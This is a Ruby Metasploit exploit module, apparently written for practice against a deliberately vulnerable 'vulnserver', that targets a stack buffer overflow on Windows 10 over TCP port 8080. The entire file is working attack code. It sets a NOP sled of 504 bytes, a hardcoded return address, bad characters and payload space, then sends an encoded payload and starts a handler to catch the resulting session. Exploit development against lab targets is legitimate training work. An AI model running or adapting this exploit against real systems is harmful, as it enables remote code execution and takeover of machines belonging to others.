# Custom metasploit exploit for vulnserver.c
# Written by @sasaga92
#
#
require 'msf/core' 

class MetasploitModule < Msf::Exploit::Remote
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Custom vulnerable server
			stack overflow',
			'Description' => %q{
				This module exploits a stack
				overflow in a
				custom vulnerable server.
				},
				'Author' => [ 'Samir Sanchez Garnica'
					],
					'Version' => '$Revision: 9999 $',
					'DefaultOptions' =>
					{
						'EXITFUNC' => 'process',
						},
						'Payload' =>
						{
							'Space' => 1400,
							'BadChars' => "\x00\x0a\x0d\xff",
							},
							'Platform' => 'win',
							'Arch' => 'x86',

							'Targets' =>
							[
								['Windows 10 PRO ES',
									{ 'Ret' => 0x10012A5F,
										'Offset' => 504 } ],
												],
												'DefaultTarget' => 0,
												'Privileged' => false
												))
		register_options(
			[
				Opt::RPORT(8080)
				], self.class)
	end
	def exploit
		connect
		junk = make_nops(target['Offset'])
		sploit = junk + [target.ret].pack('V') + make_nops(20) +
		payload.encoded
		sock.put(sploit)
		handler
		disconnect
	end
end